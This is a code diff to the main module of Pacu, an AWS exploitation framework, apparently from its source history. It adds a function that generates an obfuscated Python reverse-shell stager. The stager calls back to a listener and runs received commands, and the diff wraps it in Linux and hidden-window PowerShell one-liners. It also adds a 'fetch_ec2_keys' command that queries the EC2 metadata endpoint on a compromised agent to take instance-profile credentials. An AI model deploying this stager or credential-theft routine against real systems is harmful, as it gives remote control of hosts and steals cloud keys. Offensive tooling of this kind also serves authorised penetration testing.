@@ -14,6 +14,8 @@ import sys
 import threading
 import time
 import traceback
+import boto3
+import botocore
 
 import configure_settings
 import settings
@@ -331,6 +333,17 @@ class Main:
             self.queue.put(x)
         return
 
+    # Return a PacuProxy stager string
+    def get_proxy_stager(self, ip, port, os):
+        python_stager = "import os,platform as I,socket as E,subprocess as B,time as t,sys as X,struct as D\\nV=True\\nY=t.sleep\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      Y(5)\\n      raise\\n    try:\\n      self.s.send('{{}}\\{{}}'.format(I.system(),E.gethostname()).encode())\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode()\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while V:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        X.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=V,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while V:\\n    try:\\n      C.c()\\n    except:\\n      Y(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except SystemExit:\\n    X.exit(0)\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nX.stderr=object\\nwhile V:\\n  f()".format(ip, port)
+        if os == 'sh':  # Linux one-liner (uses \" to escape inline double-quotes)
+            return 'python3 -c "{}" &'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager))
+        elif os == 'ps':  # Windows one-liner (uses `" to escape inline double-quotes)
+            return 'Start-Process -FilePath "py" -Verb open -WindowStyle Hidden -ArgumentList "-c {}"'.format('exec(`\"`\"`\"{}`\"`\"`\")'.format(python_stager))
+        else:
+            self.print('Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(os))
+            return False
+
     def get_ssh_user(self, ssh_username):
         user_id = ''
         if ssh_username is None or ssh_username == '':
@@ -421,6 +434,8 @@ class Main:
                         elif action == 'add':
                             contents += '\nAllowTcpForwarding remote'
                             config_file.write(contents)
+                        else:
+                            config_file.write(contents)
                     with open(f'{ssh_dir}/id_rsa', 'r') as config_file:
                         ssh_priv_key = config_file.read()
 
@@ -466,10 +481,14 @@ class Main:
                                                     no longer use any proxy (route from the local
                                                     host instead)
                 shell <agent_id> <command>        Run a shell command on the remote agent
-                stager lin|win                    Generate a PacuProxy stager. The two formats available
-                                                    are python one-liners for Linux (lin) or Windows
-                                                    (win). The only difference in the payloads is how
-                                                    command-line escaping is done for valid syntax.
+                fetch_ec2_keys <agent_id>         Try to read the meta-data of the target agent to
+                                                    request a set of temporary credentials for the
+                                                    attached instance profile (if there is one),
+                                                    then save them to the Pacu database and set
+                                                    them as the active key pair
+                stager sh|ps                      Generate a PacuProxy stager. The "bash" format is
+                                                    for *sh shells in Unix, and the "ps" format is
+                                                    for PowerShell on Windows.
             list/ls                             List all modules
             search [cat[egory]] <search term>   Search the list of available modules by name or category
             help                                Display this page of information
@@ -533,10 +552,14 @@ class Main:
                                                 no longer use any proxy (route from the local
                                                 host instead)
             shell <agent_id> <command>        Run a shell command on the remote agent
-            stager lin|win                    Generate a PacuProxy stager. The two formats available
-                                                are python one-liners for Linux (lin) or Windows
-                                                (win). The only difference in the payloads is how
-                                                command-line escaping is done for valid syntax.
+            fetch_ec2_keys <agent_id>         Try to read the meta-data of the target agent to
+                                                request a set of temporary credentials for the
+                                                attached instance profile (if there is one),
+                                                then save them to the Pacu database and set
+                                                them as the active key pair
+            stager sh|ps                      Generate a PacuProxy stager. The "bash" format is
+                                                for *sh shells in Unix, and the "ps" format is
+                                                for PowerShell on Windows.
 """)
             elif command[1] == 'start':  # Start proxy server
                 if len(command) < 3:
@@ -566,6 +589,11 @@ class Main:
                     self.server.run_cmd(int(command[2]), self.server.all_connections[int(command[2])], ' '.join(command[3:]))
                 else:
                     print('** Incorrect input, expected an agent ID and a shell command. Use the format: proxy shell <agent_id> <shell command> **')
+            elif command[1] == 'fetch_ec2_keys':
+                if len(command) == 3:
+                    self.fetch_ec2_keys(int(command[2]), self.server.all_connections[int(command[2])])
+                else:
+                    self.print('** Incorrect input, expect an agent ID. Use the format: proxy fetch_ec2_keys <agent_id> **')
             elif command[1] == 'stop':  # Stop proxy server
                 if proxy_listening is False:
                     print('There does not seem to be a listener running currently.')
@@ -581,20 +609,14 @@ class Main:
                     self.server.quit(int(command[2]), self.server.all_connections[int(command[2])])
                     self.print('** Agent killed **')
                 elif len(command) == 2:
-                    print(' ** Incorrect input, excepted an agent ID, received nothing. Use format: proxy kill <agent_id> **')
+                    print('** Incorrect input, excepted an agent ID, received nothing. Use format: proxy kill <agent_id> **')
                 else:
                     print('** Incorrect input, excepted an agent ID, received: {}'.format(command[2:]))
             elif command[1] == 'stager':
                 if len(command) == 3:
-                    python_stager = "import os,platform as I,socket as E,subprocess as B,time as t,sys as X,struct as D\\nV=True\\nY=t.sleep\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      Y(5)\\n      raise\\n    try:\\n      self.s.send('{{}}\\{{}}'.format(I.system(),E.gethostname()).encode())\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode()\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while V:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        X.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=V,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='e:%s'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while V:\\n    try:\\n      C.c()\\n    except:\\n      Y(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nX.stderr=object\\nwhile V:\\n  f()".format(proxy_ip, proxy_port)
-                    if command[2] == 'lin':  # Linux one-liner (uses \" to escape inline double-quotes)
-                        self.print('python3 -c "{}" &'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager)))
-                    elif command[2] == 'win':  # Windows one-liner (uses `" to escape inline double-quotes)
-                        self.print('START -WindowStyle hidden -FilePath "python3" -ArgumentList "-c","{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)))
-                    else:
-                        self.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(command[2:]))
+                    self.print(self.get_proxy_stager(proxy_ip, proxy_port, command[2]))
                 else:
-                    self.print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(command[2:]))
+                    self.print('** Incorrect input, expected target operating system ("sh" or "ps"), received: {}'.format(command[2:]))
             elif command[1] == 'use':
                 if len(command) == 3:
                     try:
@@ -618,11 +640,18 @@ class Main:
 
                             print('Setting proxy target to agent {}...'.format(command[2]))
 
+                            old_username = proxy_ssh_username
+
                             # Find or create an SSH user
                             proxy_ssh_username = self.get_ssh_user(proxy_ssh_username)
                             if proxy_ssh_username is None:
                                 self.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.')
                                 return
+
+                            # In case there previously was a user and for some reason a new one needed to be created,
+                            # ensure that a new key gets created for them
+                            if not old_username == proxy_ssh_username:
+                                proxy_ssh_priv_key = None
 
                             restart = False
                             if proxy_ssh_priv_key is None or proxy_ssh_priv_key == '':
@@ -747,24 +776,24 @@ class Main:
         # Update boto3 and botocore to fetch the latest version of the AWS region_list
         try:
             self.print('  Using pip3 to update botocore, so we have the latest region list...\n')
-            subprocess.run(['pip3', 'install', '--upgrade', 'boto3', 'botocore'], shell=True)
+            subprocess.run(['pip3', 'install', '--upgrade', 'botocore'])
         except:
             try:
                 self.print('  pip3 failed, trying pip...\n')
-                subprocess.run(['pip', 'install', '--upgrade', 'boto3', 'botocore'], shell=True)
+                subprocess.run(['pip', 'install', '--upgrade', 'botocore'])
             except:
                 pip = self.input('  Could not use pip3 or pip to update botocore to the latest version. Enter the name of your pip binary or press Ctrl+C to exit: ').strip()
-                subprocess.run(['{}'.format(pip), 'install', '--upgrade', 'boto3', 'botocore'], shell=True)
+                subprocess.run(['{}'.format(pip), 'install', '--upgrade', 'boto3', 'botocore'])
 
         path = ''
 
         try:
             self.print('  Using pip3 to locate botocore on the operating system...\n')
-            output = subprocess.check_output('pip3 show botocore', shell=True)
+            output = subprocess.check_output('pip3 show botocore')
         except:
             try:
                 self.print('  pip3 failed, trying pip...\n')
-                output = subprocess.check_output('pip show botocore', shell=True)
+                output = subprocess.check_output('pip show botocore')
             except:
                 path = self.input('  Could not use pip3 or pip to determine botocore\'s location. Enter it now (example: /usr/local/bin/python3.6/lib/dist-packages) or press Ctrl+C to exit: ').strip()
 
@@ -830,7 +859,7 @@ class Main:
             if proxy_settings.target_agent is None or proxy_settings.target_agent == []:
                 self.print('  Running module {}...'.format(module_name))
             else:
-                self.print('  Running module {} on agent {}...'.format(module_name, proxy_settings.target_agent[0]))
+                self.print('  Running module {} on agent at {}...'.format(module_name, proxy_settings.target_agent[0]))
             self.print('    {}\n'.format(module.help()[0]['description']))
 
             try:
@@ -938,27 +967,54 @@ class Main:
             print('\nNo modules found.')
         print('')
 
-    def set_keys(self):
+    def fetch_ec2_keys(self, target, conn):
+        instance_profile = self.server.run_cmd(target, conn, 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', mute=True)
+        if not instance_profile == '' and 'not found' not in instance_profile:
+            keys = self.server.run_cmd(target, conn, f'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{instance_profile}', mute=True)
+            if '"Code" : "Success",' in keys:
+                keys = json.loads(keys)
+                self.set_keys(f'Agent{target}/{time.strftime("%m-%d@%I-%M%p")}', keys['AccessKeyId'], keys['SecretAccessKey'], keys['Token'])
+                self.print(f'Keys successfully fetched from agent {target}\'s EC2 meta-data and set as the active key pair. They will expire at {keys["Expiration"]}.\n')
+                return
+        self.print('Failed to fetch AWS keys from the EC2 meta-data, this agent is either not an EC2 instance or it does not have a valid instance profile attached to it to fetch the keys from.\n')
+        return
+
+    def set_keys(self, key_alias=None, access_key_id=None, secret_access_key=None, session_token=None):
         session = self.get_active_session()
 
-        self.print('Setting AWS Keys. Press enter to keep the value currently stored. Enter the letter C to clear the value, rather than set it. If you enter an existing key_alias, that key\'s fields will be updated with the information provided.')
+        # If key_alias is None, then it's being run normally from the command line (set_keys),
+        # otherwise it means it is set programmatically and we don't want any prompts if it is
+        # done programatically
+        if key_alias is None:
+            self.print('Setting AWS Keys. Press enter to keep the value currently stored. Enter the letter C to clear the value, rather than set it. If you enter an existing key_alias, that key\'s fields will be updated with the information provided.')
 
         # Key alias
-        new_value = self.input(f'Key alias [{session.key_alias}]: ')
+        if key_alias is None:
+            new_value = self.input(f'Key alias [{session.key_alias}]: ')
+        else:
+            new_value = key_alias
+            self.print(f'Key alias [{session.key_alias}]: {new_value}', output='file')
         if str(new_value.strip().lower()) == 'c':
             session.key_alias = None
         elif str(new_value) != '':
             session.key_alias = new_value
 
         # Access key ID
-        new_value = self.input(f'Access key ID [{session.access_key_id}]: ')
+        if key_alias is None:
+            new_value = self.input(f'Access key ID [{session.access_key_id}]: ')
+        else:
+            new_value = access_key_id
+            self.print(f'Access key ID [{session.access_key_id}]: {new_value}', output='file')
         if str(new_value.strip().lower()) == 'c':
             session.access_key_id = None
         elif str(new_value) != '':
             session.access_key_id = new_value
 
         # Secret access key (should not be entered in log files)
-        new_value = input(f'  Secret access key [{session.secret_access_key}]: ')
+        if key_alias is None:
+            new_value = input(f'  Secret access key [{session.secret_access_key}]: ')
+        else:
+            new_value = secret_access_key
         self.print('Secret access key [******]: ****** (Censored)', output='file')
         if str(new_value.strip().lower()) == 'c':
             session.secret_access_key = None
@@ -966,7 +1022,11 @@ class Main:
             session.secret_access_key = new_value
 
         # Session token (optional)
-        new_value = self.input(f'Session token (Optional - for temp AWS keys only) [{session.session_token}]: ')
+        if key_alias is None:
+            new_value = self.input(f'Session token (Optional - for temp AWS keys only) [{session.session_token}]: ')
+        else:
+            new_value = session_token
+            self.print(f'Access key ID [{session.session_token}]: {new_value}', output='file')
         if str(new_value.strip().lower()) == 'c':
             session.session_token = None
         elif str(new_value) != '':
@@ -991,7 +1051,9 @@ class Main:
         self.database.add(aws_key)
 
         self.database.commit()
-        self.print('Configuration variables have been set.')
+
+        if key_alias is None:
+            self.print('Configuration variables have been set.\n')
 
     def swap_keys(self):
         session = self.get_active_session()
@@ -1100,6 +1162,45 @@ class Main:
                     session = None
 
         return session, global_data_in_all_frames, local_data_in_all_frames
+
+    def get_boto3_client(self, service, region=None, user_agent=None, socks_port=8001, parameter_validation=True):
+        session = self.get_active_session()
+        proxy_settings = self.get_proxy_settings()
+
+        boto_config = botocore.config.Config(
+            proxies={'https': f'socks5://127.0.0.1:{socks_port}', 'http': f'socks5://127.0.0.1:{socks_port}'} if not proxy_settings.target_agent == [] else None,
+            user_agent=user_agent,  # If user_agent=None, botocore will use the real UA which is what we want
+            parameter_validation=parameter_validation
+        )
+
+        return boto3.client(
+            service,
+            region_name=region,  # Whether region has a value or is None, it will work here
+            aws_access_key_id=session.access_key_id,
+            aws_secret_access_key=session.secret_access_key,
+            aws_session_token=session.session_token,
+            config=boto_config
+        )
+
+    def get_boto3_resource(self, service, region=None, user_agent=None, socks_port=8001, parameter_validation=True):
+        # All the comments from get_boto3_client apply here too
+        session = self.get_active_session()
+        proxy_settings = self.get_proxy_settings()
+
+        boto_config = botocore.config.Config(
+            proxies={'https': f'socks5://127.0.0.1:{socks_port}', 'http': f'socks5://127.0.0.1:{socks_port}'} if not proxy_settings.target_agent == [] else None,
+            user_agent=user_agent,
+            parameter_validation=parameter_validation
+        )
+
+        return boto3.resource(
+            service,
+            region_name=region,
+            aws_access_key_id=session.access_key_id,
+            aws_secret_access_key=session.secret_access_key,
+            aws_session_token=session.session_token,
+            config=boto_config
+        )
 
     def initialize_tab_completion(self):
         try:
@@ -1263,6 +1364,7 @@ class Main:
                                           #&&&&&&(                 .&&&&&&&.     .&&&&&&&,     *%&&&&&&&&&&&&&&&&/        /%&&&&&&&&&&&&&&(.
 
                     """)
+
                     configure_settings.copy_settings_template_into_settings_file_if_not_present()
                     set_sigint_handler(exit_text='\nA database must be created for Pacu to work properly.')
                     setup_database_if_not_present(settings.DATABASE_FILE_PATH)
@@ -1273,18 +1375,19 @@ class Main:
                     self.proxy = ProxySettings()
                     self.queue = Queue()
 
+                    self.check_sessions()
+
+                    self.initialize_tab_completion()
+                    self.display_help()
+
                     proxy_settings = self.get_proxy_settings()
                     if proxy_settings is None:
                         self.proxy.activate(self.database)
                         proxy_settings = self.get_proxy_settings()
                     if proxy_settings is not None and proxy_settings.listening is True:
                         # PacuProxy was listening on last shutdown, so restart it
+                        self.print('Auto-starting PacuProxy listener from previous session on {}:{}...'.format(proxy_settings.ip, proxy_settings.port))
                         self.start_proxy()
-
-                    self.check_sessions()
-
-                    self.initialize_tab_completion()
-                    self.display_help()
 
                     idle_ready = True
 
